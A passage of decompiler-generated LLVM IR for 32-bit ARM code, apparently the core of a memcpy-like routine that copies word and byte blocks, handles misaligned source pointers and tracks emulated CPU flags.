  %v3_1512c = add i32 %v0_1512c, 4
  %v4_1512c = inttoptr i32 %v3_1512c to i32*
  %v5_1512c = load i32, i32* %v4_1512c, align 4
  store i32 %v5_1512c, i32* %r4.global-to-local, align 4
  %v6_1512c = add i32 %v0_1512c, 8
  %v7_1512c = inttoptr i32 %v6_1512c to i32*
  %v8_1512c = load i32, i32* %v7_1512c, align 4
  store i32 %v8_1512c, i32* %ip.global-to-local, align 4
  %v9_1512c = add i32 %v0_1512c, 12
  %v10_1512c = inttoptr i32 %v9_1512c to i32*
  %v11_1512c = load i32, i32* %v10_1512c, align 4
  store i32 %v11_1512c, i32* %lr.global-to-local, align 4
  %v12_1512c = add i32 %v0_1512c, 16
  store i32 %v12_1512c, i32* %r1.global-to-local, align 4
  %v1_15130 = inttoptr i32 %v0_15130 to i32*
  store i32 %v2_1512c, i32* %v1_15130, align 4
  %v3_15130 = add i32 %v0_15130, 4
  %v4_15130 = inttoptr i32 %v3_15130 to i32*
  %v5_15130 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15130, i32* %v4_15130, align 4
  %v6_15130 = add i32 %v0_15130, 8
  %v7_15130 = inttoptr i32 %v6_15130 to i32*
  %v8_15130 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_15130, i32* %v7_15130, align 4
  %v9_15130 = add i32 %v0_15130, 12
  %v10_15130 = inttoptr i32 %v9_15130 to i32*
  %v11_15130 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_15130, i32* %v10_15130, align 4
  %v12_15130 = add i32 %v0_15130, 16
  store i32 %v12_15130, i32* %r0.global-to-local, align 4
  %v0_15134 = load i32, i32* %r1.global-to-local, align 4
  %v1_15134 = inttoptr i32 %v0_15134 to i32*
  %v2_15134 = load i32, i32* %v1_15134, align 4
  store i32 %v2_15134, i32* %r3.global-to-local, align 4
  %v3_15134 = add i32 %v0_15134, 4
  %v4_15134 = inttoptr i32 %v3_15134 to i32*
  %v5_15134 = load i32, i32* %v4_15134, align 4
  store i32 %v5_15134, i32* %r4.global-to-local, align 4
  %v6_15134 = add i32 %v0_15134, 8
  %v7_15134 = inttoptr i32 %v6_15134 to i32*
  %v8_15134 = load i32, i32* %v7_15134, align 4
  store i32 %v8_15134, i32* @ip, align 4
  %v9_15134 = add i32 %v0_15134, 12
  %v10_15134 = inttoptr i32 %v9_15134 to i32*
  %v11_15134 = load i32, i32* %v10_15134, align 4
  store i32 %v11_15134, i32* @lr, align 4
  %v12_15134 = add i32 %v0_15134, 16
  store i32 %v12_15134, i32* @r1, align 4
  %v1_15138 = inttoptr i32 %v12_15130 to i32*
  store i32 %v2_15134, i32* %v1_15138, align 4
  %v3_15138 = add i32 %v0_15130, 20
  %v4_15138 = inttoptr i32 %v3_15138 to i32*
  %v5_15138 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15138, i32* %v4_15138, align 4
  %v6_15138 = add i32 %v0_15130, 24
  %v7_15138 = inttoptr i32 %v6_15138 to i32*
  %v8_15138 = load i32, i32* @ip, align 4
  store i32 %v8_15138, i32* %v7_15138, align 4
  %v9_15138 = add i32 %v0_15130, 28
  %v10_15138 = inttoptr i32 %v9_15138 to i32*
  %v11_15138 = load i32, i32* @lr, align 4
  store i32 %v11_15138, i32* %v10_15138, align 4
  %v12_15138 = add i32 %v0_15130, 32
  store i32 %v12_15138, i32* @r0, align 4
  %v0_1513c = load i32, i32* %r2.global-to-local, align 4
  %v2_1513c = add i32 %v0_1513c, -32
  store i32 %v2_1513c, i32* %r2.global-to-local, align 4
  %v6_15140 = icmp slt i32 %v0_1513c, 32
  br i1 %v6_15140, label %dec_label_pc_15144, label %dec_label_pc_1512c.dec_label_pc_1512c_crit_edge

dec_label_pc_1512c.dec_label_pc_1512c_crit_edge:  ; preds = %dec_label_pc_1512c
  %v0_1512c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1512c

dec_label_pc_15144:                               ; preds = %dec_label_pc_1512c
  %v4_15144 = add i32 %v0_1513c, -16
  %v6_15144 = add i32 %v0_1513c, 2147483616
  %v7_15144 = and i32 %v4_15144, %v6_15144
  %v8_15144 = icmp slt i32 %v7_15144, 0
  store i1 %v8_15144, i1* %cpsr_v.global-to-local, align 1
  %v9_15144 = icmp slt i32 %v4_15144, 0
  store i1 %v9_15144, i1* %cpsr_n.global-to-local, align 1
  %v10_15144 = icmp eq i32 %v4_15144, 0
  store i1 %v10_15144, i1* %cpsr_z.global-to-local, align 1
  %v5_15148 = icmp slt i32 %v2_1513c, -16
  br i1 %v5_15148, label %.thread1, label %bb128

bb128:                                            ; preds = %dec_label_pc_15144
  %v6_15148 = load i32, i32* @r1, align 4
  %v7_15148 = inttoptr i32 %v6_15148 to i32*
  %v8_15148 = load i32, i32* %v7_15148, align 4
  store i32 %v8_15148, i32* %r3.global-to-local, align 4
  %v9_15148 = add i32 %v6_15148, 4
  %v10_15148 = inttoptr i32 %v9_15148 to i32*
  %v11_15148 = load i32, i32* %v10_15148, align 4
  store i32 %v11_15148, i32* %r4.global-to-local, align 4
  %v12_15148 = add i32 %v6_15148, 8
  %v13_15148 = inttoptr i32 %v12_15148 to i32*
  %v14_15148 = load i32, i32* %v13_15148, align 4
  store i32 %v14_15148, i32* @ip, align 4
  %v15_15148 = add i32 %v6_15148, 12
  %v16_15148 = inttoptr i32 %v15_15148 to i32*
  %v17_15148 = load i32, i32* %v16_15148, align 4
  store i32 %v17_15148, i32* @lr, align 4
  %v18_15148 = add i32 %v6_15148, 16
  store i32 %v18_15148, i32* @r1, align 4
  %v7_1514c = inttoptr i32 %v12_15138 to i32*
  store i32 %v8_15148, i32* %v7_1514c, align 4
  %v9_1514c = add i32 %v0_15130, 36
  %v10_1514c = inttoptr i32 %v9_1514c to i32*
  %v11_1514c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_1514c, i32* %v10_1514c, align 4
  %v12_1514c = add i32 %v0_15130, 40
  %v13_1514c = inttoptr i32 %v12_1514c to i32*
  %v14_1514c = load i32, i32* @ip, align 4
  store i32 %v14_1514c, i32* %v13_1514c, align 4
  %v15_1514c = add i32 %v0_15130, 44
  %v16_1514c = inttoptr i32 %v15_1514c to i32*
  %v17_1514c = load i32, i32* @lr, align 4
  store i32 %v17_1514c, i32* %v16_1514c, align 4
  %v18_1514c = add i32 %v0_15130, 48
  store i32 %v18_1514c, i32* @r0, align 4
  %v6_15150 = load i32, i32* %r2.global-to-local, align 4
  %v7_15150 = add i32 %v6_15150, -16
  store i32 %v7_15150, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15144, %bb128
  %v3_15160101 = phi i32 [ %v12_15138, %dec_label_pc_15144 ], [ %v18_1514c, %bb128 ]
  %v0_1515895 = phi i32 [ %v2_1513c, %dec_label_pc_15144 ], [ %v7_15150, %bb128 ]
  %v2_15154 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15154, i32* @r4, align 4
  br label %dec_label_pc_15158

dec_label_pc_15158:                               ; preds = %dec_label_pc_15120, %.thread1
  %v3_15160100 = phi i32 [ %v0_1513092, %dec_label_pc_15120 ], [ %v3_15160101, %.thread1 ]
  %v0_15158 = phi i32 [ %v2_15120, %dec_label_pc_15120 ], [ %v0_1515895, %.thread1 ]
  %v1_15158 = add i32 %v0_15158, 20
  store i32 %v1_15158, i32* %r2.global-to-local, align 4
  %v3_15158 = sub i32 0, %v0_15158
  %v4_15158 = and i32 %v1_15158, %v3_15158
  %v5_15158 = icmp slt i32 %v4_15158, 0
  store i1 %v5_15158, i1* %cpsr_v.global-to-local, align 1
  %v6_15158 = icmp slt i32 %v1_15158, 0
  store i1 %v6_15158, i1* %cpsr_n.global-to-local, align 1
  %v7_15158 = icmp eq i32 %v1_15158, 0
  store i1 %v7_15158, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1515c

dec_label_pc_1515c:                               ; preds = %.thread117, %dec_label_pc_15158
  %v0_1516c.pre147 = phi i32 [ %v0_1516c.pre, %.thread117 ], [ %v1_15158, %dec_label_pc_15158 ]
  %v3_15160 = phi i32 [ %v3_1516098118, %.thread117 ], [ %v3_15160100, %dec_label_pc_15158 ]
  %v1_15164 = phi i1 [ %v1_15168, %.thread117 ], [ %v5_15158, %dec_label_pc_15158 ]
  %v0_15164 = phi i1 [ %v0_15168, %.thread117 ], [ %v6_15158, %dec_label_pc_15158 ]
  %v2_1515c = xor i1 %v1_15164, %v0_15164
  br i1 %v2_1515c, label %.thread117, label %bb129

bb129:                                            ; preds = %dec_label_pc_1515c
  %v3_1515c = load i32, i32* @r1, align 4
  %v4_1515c = inttoptr i32 %v3_1515c to i32*
  %v5_1515c = load i32, i32* %v4_1515c, align 4
  store i32 %v5_1515c, i32* %r3.global-to-local, align 4
  %v6_1515c = add i32 %v3_1515c, 4
  %v7_1515c = inttoptr i32 %v6_1515c to i32*
  %v8_1515c = load i32, i32* %v7_1515c, align 4
  store i32 %v8_1515c, i32* @ip, align 4
  %v9_1515c = add i32 %v3_1515c, 8
  %v10_1515c = inttoptr i32 %v9_1515c to i32*
  %v11_1515c = load i32, i32* %v10_1515c, align 4
  store i32 %v11_1515c, i32* @lr, align 4
  %v12_1515c = add i32 %v3_1515c, 12
  store i32 %v12_1515c, i32* @r1, align 4
  %v4_15160 = inttoptr i32 %v3_15160 to i32*
  store i32 %v5_1515c, i32* %v4_15160, align 4
  %v6_15160 = add i32 %v3_15160, 4
  %v7_15160 = inttoptr i32 %v6_15160 to i32*
  %v8_15160 = load i32, i32* @ip, align 4
  store i32 %v8_15160, i32* %v7_15160, align 4
  %v9_15160 = add i32 %v3_15160, 8
  %v10_15160 = inttoptr i32 %v9_15160 to i32*
  %v11_15160 = load i32, i32* @lr, align 4
  store i32 %v11_15160, i32* %v10_15160, align 4
  %v12_15160 = add i32 %v3_15160, 12
  store i32 %v12_15160, i32* @r0, align 4
  %v3_15164 = load i32, i32* %r2.global-to-local, align 4
  %v4_15164 = add i32 %v3_15164, -12
  store i32 %v4_15164, i32* %r2.global-to-local, align 4
  %v6_15164 = sub i32 11, %v3_15164
  %v7_15164 = and i32 %v6_15164, %v3_15164
  %v8_15164 = icmp slt i32 %v7_15164, 0
  store i1 %v8_15164, i1* %cpsr_v.global-to-local, align 1
  %v9_15164 = icmp slt i32 %v4_15164, 0
  store i1 %v9_15164, i1* %cpsr_n.global-to-local, align 1
  %v10_15164 = icmp eq i32 %v3_15164, 12
  store i1 %v10_15164, i1* %cpsr_z.global-to-local, align 1
  br label %.thread117

.thread117:                                       ; preds = %dec_label_pc_1515c, %bb129
  %v0_1516c.pre = phi i32 [ %v4_15164, %bb129 ], [ %v0_1516c.pre147, %dec_label_pc_1515c ]
  %v3_1516098118 = phi i32 [ %v12_15160, %bb129 ], [ %v3_15160, %dec_label_pc_1515c ]
  %v1_15168 = phi i1 [ %v8_15164, %bb129 ], [ %v1_15164, %dec_label_pc_1515c ]
  %v0_15168 = phi i1 [ %v9_15164, %bb129 ], [ %v0_15164, %dec_label_pc_1515c ]
  %v2_15168 = xor i1 %v1_15168, %v0_15168
  br i1 %v2_15168, label %dec_label_pc_1516c, label %dec_label_pc_1515c

dec_label_pc_1516c:                               ; preds = %.thread117, %dec_label_pc_15118
  %v7_1517c = phi i32 [ %v0_1513092, %dec_label_pc_15118 ], [ %v3_1516098118, %.thread117 ]
  %v0_1516c = phi i32 [ %v2_15118, %dec_label_pc_15118 ], [ %v0_1516c.pre, %.thread117 ]
  %v2_1516c = add i32 %v0_1516c, 8
  store i32 %v2_1516c, i32* %r2.global-to-local, align 4
  %v4_1516c = sub i32 0, %v0_1516c
  %v5_1516c = and i32 %v2_1516c, %v4_1516c
  %v6_1516c = icmp slt i32 %v5_1516c, 0
  store i1 %v6_1516c, i1* %cpsr_v.global-to-local, align 1
  %v7_1516c = icmp slt i32 %v2_1516c, 0
  store i1 %v7_1516c, i1* %cpsr_n.global-to-local, align 1
  %v8_1516c = icmp eq i32 %v2_1516c, 0
  store i1 %v8_1516c, i1* %cpsr_z.global-to-local, align 1
  %v5_15170 = icmp slt i32 %v0_1516c, -8
  br i1 %v5_15170, label %bb131, label %dec_label_pc_15174

dec_label_pc_15174:                               ; preds = %dec_label_pc_1516c
  %v6_15174 = add i32 %v0_1516c, 4
  store i32 %v6_15174, i32* %r2.global-to-local, align 4
  %v8_15174 = sub i32 -5, %v0_1516c
  %v9_15174 = and i32 %v8_15174, %v2_1516c
  %v10_15174 = icmp slt i32 %v9_15174, 0
  store i1 %v10_15174, i1* %cpsr_v.global-to-local, align 1
  %v11_15174 = icmp slt i32 %v6_15174, 0
  store i1 %v11_15174, i1* %cpsr_n.global-to-local, align 1
  %v12_15174 = icmp eq i32 %v2_1516c, 4
  store i1 %v12_15174, i1* %cpsr_z.global-to-local, align 1
  %v5_15178 = icmp slt i32 %v2_1516c, 4
  %v6_15178 = load i32, i32* @r1, align 4
  %v7_15178 = inttoptr i32 %v6_15178 to i32*
  %v8_15178 = load i32, i32* %v7_15178, align 4
  store i32 %v8_15178, i32* %r3.global-to-local, align 4
  %v10_15178 = add i32 %v6_15178, 4
  br i1 %v5_15178, label %.thread5, label %bb130

.thread5:                                         ; preds = %dec_label_pc_15174
  store i32 %v10_15178, i32* @r1, align 4
  %v8_1517c = inttoptr i32 %v7_1517c to i32*
  store i32 %v8_15178, i32* %v8_1517c, align 4
  %v9_1517c = load i32, i32* @r0, align 4
  %v10_1517c = add i32 %v9_1517c, 4
  store i32 %v10_1517c, i32* @r0, align 4
  %v0_1518c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb131

bb130:                                            ; preds = %dec_label_pc_15174
  %v10_15180 = inttoptr i32 %v10_15178 to i32*
  %v11_15180 = load i32, i32* %v10_15180, align 4
  store i32 %v11_15180, i32* @ip, align 4
  %v12_15180 = add i32 %v6_15178, 8
  store i32 %v12_15180, i32* @r1, align 4
  %v7_15184 = inttoptr i32 %v7_1517c to i32*
  store i32 %v8_15178, i32* %v7_15184, align 4
  %v9_15184 = add i32 %v7_1517c, 4
  %v10_15184 = inttoptr i32 %v9_15184 to i32*
  %v11_15184 = load i32, i32* @ip, align 4
  store i32 %v11_15184, i32* %v10_15184, align 4
  %v12_15184 = add i32 %v7_1517c, 8
  store i32 %v12_15184, i32* @r0, align 4
  %v6_15188 = load i32, i32* %r2.global-to-local, align 4
  %v7_15188 = add i32 %v6_15188, -4
  store i32 %v7_15188, i32* %r2.global-to-local, align 4
  br label %bb131

bb131:                                            ; preds = %.thread5, %.thread11, %dec_label_pc_1516c, %bb, %dec_label_pc_15334, %dec_label_pc_152c8, %dec_label_pc_1525c, %bb130
  %v2_1519c = phi i32 [ %v10_1517c, %.thread5 ], [ %v0_1522c75, %.thread11 ], [ %v7_1517c, %dec_label_pc_1516c ], [ %v1_150f0, %bb ], [ %v2_1519c113, %dec_label_pc_15334 ], [ %v2_1519c112, %dec_label_pc_152c8 ], [ %v2_1519c111, %dec_label_pc_1525c ], [ %v12_15184, %bb130 ]
  %v0_1518c = phi i32 [ %v0_1518c.pre, %.thread5 ], [ %v2_151d4, %.thread11 ], [ %v2_1516c, %dec_label_pc_1516c ], [ %v2_15100, %bb ], [ %v0_1518c109, %dec_label_pc_15334 ], [ %v0_1518c108, %dec_label_pc_152c8 ], [ %v0_1518c107, %dec_label_pc_1525c ], [ %v7_15188, %bb130 ]
  %v1_1518c = add i32 %v0_1518c, 4
  store i32 %v1_1518c, i32* %r2.global-to-local, align 4
  %v3_1518c = sub i32 0, %v0_1518c
  %v4_1518c = and i32 %v1_1518c, %v3_1518c
  %v5_1518c = icmp slt i32 %v4_1518c, 0
  store i1 %v5_1518c, i1* %cpsr_v.global-to-local, align 1
  %v6_1518c = icmp slt i32 %v1_1518c, 0
  store i1 %v6_1518c, i1* %cpsr_n.global-to-local, align 1
  %v7_1518c = icmp eq i32 %v1_1518c, 0
  store i1 %v7_1518c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1518c, label %bb132, label %bb133

bb132:                                            ; preds = %bb131
  %v3_15190 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_15190, i32* %r0.global-to-local, align 4
  ret i32 %v3_15190

bb133:                                            ; preds = %bb131
  %v1_15194 = add i32 %v0_1518c, 2
  %v3_15194 = sub i32 -3, %v0_1518c
  %v4_15194 = and i32 %v3_15194, %v1_1518c
  %v5_15194 = icmp slt i32 %v4_15194, 0
  store i1 %v5_15194, i1* %cpsr_v.global-to-local, align 1
  %v6_15194 = icmp slt i32 %v1_15194, 0
  store i1 %v6_15194, i1* %cpsr_n.global-to-local, align 1
  %v7_15194 = icmp eq i32 %v1_1518c, 2
  store i1 %v7_15194, i1* %cpsr_z.global-to-local, align 1
  %v0_15198 = load i32, i32* @r1, align 4
  %v1_15198 = inttoptr i32 %v0_15198 to i8*
  %v2_15198 = load i8, i8* %v1_15198, align 1
  %v3_15198 = zext i8 %v2_15198 to i32
  store i32 %v3_15198, i32* %r3.global-to-local, align 4
  %v5_15198 = add i32 %v0_15198, 1
  store i32 %v5_15198, i32* %r1.global-to-local, align 4
  %v3_1519c = inttoptr i32 %v2_1519c to i8*
  store i8 %v2_15198, i8* %v3_1519c, align 1
  %v4_1519c = load i32, i32* @r0, align 4
  %v5_1519c = add i32 %v4_1519c, 1
  store i32 %v5_1519c, i32* %r0.global-to-local, align 4
  %v0_151a0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_151a0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_151a0 = xor i1 %v0_151a0, %v1_151a0
  br i1 %v2_151a0, label %.thread119, label %bb134

bb134:                                            ; preds = %bb133
  %v3_151a0 = load i32, i32* %r1.global-to-local, align 4
  %v4_151a0 = inttoptr i32 %v3_151a0 to i8*
  %v5_151a0 = load i8, i8* %v4_151a0, align 1
  %v6_151a0 = zext i8 %v5_151a0 to i32
  store i32 %v6_151a0, i32* %r3.global-to-local, align 4
  %v8_151a0 = add i32 %v3_151a0, 1
  store i32 %v8_151a0, i32* %r1.global-to-local, align 4
  %v6_151a4 = inttoptr i32 %v5_1519c to i8*
  store i8 %v5_151a0, i8* %v6_151a4, align 1
  %v7_151a4 = load i32, i32* %r0.global-to-local, align 4
  %v8_151a4 = add i32 %v7_151a4, 1
  store i32 %v8_151a4, i32* %r0.global-to-local, align 4
  %v1_151a8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_151a8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread119

.thread119:                                       ; preds = %bb133, %bb134
  %v7_151ac = phi i32 [ %v8_151a4, %bb134 ], [ %v5_1519c, %bb133 ]
  %v2_151ac = phi i1 [ %v2_151a8.pre, %bb134 ], [ %v1_151a0, %bb133 ]
  %v1_151ac = phi i1 [ %v1_151a8.pre, %bb134 ], [ %v0_151a0, %bb133 ]
  %v0_151a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_151a8 = xor i1 %v2_151ac, %v1_151ac
  %v4_151a8 = or i1 %v0_151a8, %v3_151a8
  br i1 %v4_151a8, label %.thread120, label %bb135

bb135:                                            ; preds = %.thread119
  %v5_151a8 = load i32, i32* %r1.global-to-local, align 4
  %v6_151a8 = inttoptr i32 %v5_151a8 to i8*
  %v7_151a8 = load i8, i8* %v6_151a8, align 1
  %v8_151a8 = zext i8 %v7_151a8 to i32
  store i32 %v8_151a8, i32* %r3.global-to-local, align 4
  %v10_151a8 = add i32 %v5_151a8, 1
  store i32 %v10_151a8, i32* %r1.global-to-local, align 4
  %v8_151ac = inttoptr i32 %v7_151ac to i8*
  store i8 %v7_151a8, i8* %v8_151ac, align 1
  %v9_151ac = load i32, i32* %r0.global-to-local, align 4
  %v10_151ac = add i32 %v9_151ac, 1
  store i32 %v10_151ac, i32* %r0.global-to-local, align 4
  br label %.thread120

.thread120:                                       ; preds = %.thread119, %bb135
  %v2_151b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_151b0, i32* %r0.global-to-local, align 4
  ret i32 %v2_151b0

dec_label_pc_151b4:                               ; preds = %dec_label_pc_15108
  %v1_151b4 = sub nsw i32 4, %v1_15108
  store i32 %v1_151b4, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_151b8 = icmp ult i32 %v1_151b4, 2
  store i1 %v8_151b8, i1* %cpsr_n.global-to-local, align 1
  %v9_151b8 = icmp eq i32 %v1_151b4, 2
  store i1 %v9_151b8, i1* %cpsr_z.global-to-local, align 1
  %v1_151bc = inttoptr i32 %v0_150f0 to i8*
  %v2_151bc = load i8, i8* %v1_151bc, align 1
  %v3_151bc = zext i8 %v2_151bc to i32
  store i32 %v3_151bc, i32* %r3.global-to-local, align 4
  %v5_151bc = add i32 %v0_150f0, 1
  store i32 %v5_151bc, i32* @r1, align 4
  %v3_151c0 = inttoptr i32 %v1_150f0 to i8*
  store i8 %v2_151bc, i8* %v3_151c0, align 1
  %v4_151c0 = load i32, i32* @r0, align 4
  %v5_151c0 = add i32 %v4_151c0, 1
  store i32 %v5_151c0, i32* @r0, align 4
  br i1 %v8_151b8, label %.thread11, label %bb136

bb136:                                            ; preds = %dec_label_pc_151b4
  %v6_151c4 = load i32, i32* @r1, align 4
  %v7_151c4 = inttoptr i32 %v6_151c4 to i8*
  %v8_151c4 = load i8, i8* %v7_151c4, align 1
  %v9_151c4 = zext i8 %v8_151c4 to i32
  store i32 %v9_151c4, i32* %r3.global-to-local, align 4
  %v11_151c4 = add i32 %v6_151c4, 1
  store i32 %v11_151c4, i32* @r1, align 4
  %v9_151c8 = inttoptr i32 %v5_151c0 to i8*
  store i8 %v8_151c4, i8* %v9_151c8, align 1
  %v10_151c8 = load i32, i32* @r0, align 4
  %v11_151c8 = add i32 %v10_151c8, 1
  store i32 %v11_151c8, i32* @r0, align 4
  br i1 %v9_151b8, label %.thread11, label %bb137

bb137:                                            ; preds = %bb136
  %v8_151cc = load i32, i32* @r1, align 4
  %v9_151cc = inttoptr i32 %v8_151cc to i8*
  %v10_151cc = load i8, i8* %v9_151cc, align 1
  %v11_151cc = zext i8 %v10_151cc to i32
  store i32 %v11_151cc, i32* %r3.global-to-local, align 4
  %v13_151cc = add i32 %v8_151cc, 1
  store i32 %v13_151cc, i32* @r1, align 4
  %v11_151d0 = inttoptr i32 %v11_151c8 to i8*
  store i8 %v10_151cc, i8* %v11_151d0, align 1
  %v12_151d0 = load i32, i32* @r0, align 4
  %v13_151d0 = add i32 %v12_151d0, 1
  store i32 %v13_151d0, i32* @r0, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb136, %dec_label_pc_151b4, %bb137
  %v0_1522c75 = phi i32 [ %v11_151c8, %bb136 ], [ %v5_151c0, %dec_label_pc_151b4 ], [ %v13_151d0, %bb137 ]
  %v0_151d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_151d4 = load i32, i32* @ip, align 4
  %v2_151d4 = sub i32 %v0_151d4, %v1_151d4
  store i32 %v2_151d4, i32* %r2.global-to-local, align 4
  %v4_151d4 = xor i32 %v1_151d4, %v0_151d4
  %v5_151d4 = xor i32 %v2_151d4, %v0_151d4
  %v6_151d4 = and i32 %v5_151d4, %v4_151d4
  %v7_151d4 = icmp slt i32 %v6_151d4, 0
  store i1 %v7_151d4, i1* %cpsr_v.global-to-local, align 1
  %v8_151d4 = icmp slt i32 %v2_151d4, 0
  store i1 %v8_151d4, i1* %cpsr_n.global-to-local, align 1
  %v9_151d4 = icmp eq i32 %v0_151d4, %v1_151d4
  store i1 %v9_151d4, i1* %cpsr_z.global-to-local, align 1
  %v5_151d8 = icmp slt i32 %v0_151d4, %v1_151d4
  br i1 %v5_151d8, label %bb131, label %dec_label_pc_151dc

dec_label_pc_151dc:                               ; preds = %.thread11
  %v0_151dc = load i32, i32* @r1, align 4
  %v1_151dc = urem i32 %v0_151dc, 4
  store i32 %v1_151dc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_151dc = icmp eq i32 %v1_151dc, 0
  store i1 %v2_151dc, i1* %cpsr_z.global-to-local, align 1
  %extract.t123 = trunc i32 %v0_151dc to i2
  br i1 %v2_151dc, label %dec_label_pc_15118, label %dec_label_pc_151e4

dec_label_pc_151e4:                               ; preds = %dec_label_pc_15110, %dec_label_pc_151dc
  %v0_1522c74 = phi i32 [ %v1_150f0, %dec_label_pc_15110 ], [ %v0_1522c75, %dec_label_pc_151dc ]
  %v0_152d8 = phi i32 [ %v2_15100, %dec_label_pc_15110 ], [ %v2_151d4, %dec_label_pc_151dc ]
  %v0_151ec.off0 = phi i2 [ %extract.t, %dec_label_pc_15110 ], [ %extract.t123, %dec_label_pc_151dc ]
  %v0_151e4 = phi i32 [ %v0_150f0, %dec_label_pc_15110 ], [ %v0_151dc, %dec_label_pc_151dc ]
  %v1_151e4 = and i32 %v0_151e4, -4
  store i32 %v1_151e4, i32* %r1.global-to-local, align 4
  %v1_151e8 = inttoptr i32 %v1_151e4 to i32*
  %v2_151e8 = load i32, i32* %v1_151e8, align 4
  store i32 %v2_151e8, i32* @lr, align 4
  %v4_151e8 = add i32 %v1_151e4, 4
  store i32 %v4_151e8, i32* %r1.global-to-local, align 4
  %v2_152d0 = add i32 %v0_152d8, -12
  %v4_152d0 = sub i32 11, %v0_152d8
  %v5_152d0 = and i32 %v4_152d0, %v0_152d8
  %v6_152d0 = icmp slt i32 %v5_152d0, 0
  store i1 %v6_152d0, i1* %cpsr_v.global-to-local, align 1
  %v7_152d0 = icmp slt i32 %v2_152d0, 0
  store i1 %v7_152d0, i1* %cpsr_n.global-to-local, align 1
  %v8_152d0 = icmp eq i32 %v0_152d8, 12
  store i1 %v8_152d0, i1* %cpsr_z.global-to-local, align 1
  %v5_152d4 = icmp slt i32 %v0_152d8, 12
  switch i2 %v0_151ec.off0, label %dec_label_pc_151f8 [
    i2 -1, label %dec_label_pc_152d0
    i2 -2, label %dec_label_pc_15264
  ]

dec_label_pc_151f8:                               ; preds = %dec_label_pc_151e4
  br i1 %v5_152d4, label %dec_label_pc_15244, label %dec_label_pc_15200

dec_label_pc_15200:                               ; preds = %dec_label_pc_151f8
  store i32 %v2_152d0, i32* %r2.global-to-local, align 4
  %v3_15204 = load i32, i32* @r4, align 4
  store i32 %v3_15204, i32* %stack_var_-16, align 4
  %v6_15204 = load i32, i32* @r5, align 4
  store i32 %v6_15204, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15208

dec_label_pc_15208:                               ; preds = %dec_label_pc_15208.dec_label_pc_15208_crit_edge, %dec_label_pc_15200
  %v0_1522c = phi i32 [ %v12_1522c, %dec_label_pc_15208.dec_label_pc_15208_crit_edge ], [ %v0_1522c74, %dec_label_pc_15200 ]
  %v0_1520c = phi i32 [ %v0_1520c.pre, %dec_label_pc_15208.dec_label_pc_15208_crit_edge ], [ %v4_151e8, %dec_label_pc_15200 ]
  %v0_15208 = phi i32 [ %v0_15208.pre, %dec_label_pc_15208.dec_label_pc_15208_crit_edge ], [ %v2_151e8, %dec_label_pc_15200 ]
  %v3_15208 = udiv i32 %v0_15208, 256
  store i32 %v3_15208, i32* %r3.global-to-local, align 4
  %v1_1520c = inttoptr i32 %v0_1520c to i32*
  %v2_1520c = load i32, i32* %v1_1520c, align 4
  store i32 %v2_1520c, i32* %r4.global-to-local, align 4
  %v3_1520c = add i32 %v0_1520c, 4
  %v4_1520c = inttoptr i32 %v3_1520c to i32*
  %v5_1520c = load i32, i32* %v4_1520c, align 4
  store i32 %v5_1520c, i32* %r5.global-to-local, align 4
  %v6_1520c = add i32 %v0_1520c, 8
  %v7_1520c = inttoptr i32 %v6_1520c to i32*
  %v8_1520c = load i32, i32* %v7_1520c, align 4
  store i32 %v8_1520c, i32* %ip.global-to-local, align 4
  %v9_1520c = add i32 %v0_1520c, 12
  %v10_1520c = inttoptr i32 %v9_1520c to i32*
  %v11_1520c = load i32, i32* %v10_1520c, align 4
  store i32 %v11_1520c, i32* @lr, align 4
  %v12_1520c = add i32 %v0_1520c, 16
  store i32 %v12_1520c, i32* %r1.global-to-local, align 4
  %v4_15210 = mul i32 %v2_1520c, 16777216
  %v5_15210 = or i32 %v4_15210, %v3_15208
  store i32 %v5_15210, i32* %r3.global-to-local, align 4
  %v3_15214 = udiv i32 %v2_1520c, 256
  %v4_15218 = mul i32 %v5_1520c, 16777216
  %v5_15218 = or i32 %v4_15218, %v3_15214
  store i32 %v5_15218, i32* %r4.global-to-local, align 4
  %v3_1521c = udiv i32 %v5_1520c, 256
  %v4_15220 = mul i32 %v8_1520c, 16777216
  %v5_15220 = or i32 %v4_15220, %v3_1521c
  store i32 %v5_15220, i32* %r5.global-to-local, align 4
  %v3_15224 = udiv i32 %v8_1520c, 256
  %v4_15228 = mul i32 %v11_1520c, 16777216
  %v5_15228 = or i32 %v4_15228, %v3_15224
  store i32 %v5_15228, i32* @ip, align 4
  %v1_1522c = inttoptr i32 %v0_1522c to i32*
  store i32 %v5_15210, i32* %v1_1522c, align 4
  %v3_1522c = add i32 %v0_1522c, 4
  %v4_1522c = inttoptr i32 %v3_1522c to i32*
  %v5_1522c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1522c, i32* %v4_1522c, align 4
  %v6_1522c = add i32 %v0_1522c, 8
  %v7_1522c = inttoptr i32 %v6_1522c to i32*
  %v8_1522c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1522c, i32* %v7_1522c, align 4
  %v9_1522c = add i32 %v0_1522c, 12
  %v10_1522c = inttoptr i32 %v9_1522c to i32*
  %v11_1522c = load i32, i32* @ip, align 4
  store i32 %v11_1522c, i32* %v10_1522c, align 4
  %v12_1522c = add i32 %v0_1522c, 16
  store i32 %v12_1522c, i32* @r0, align 4
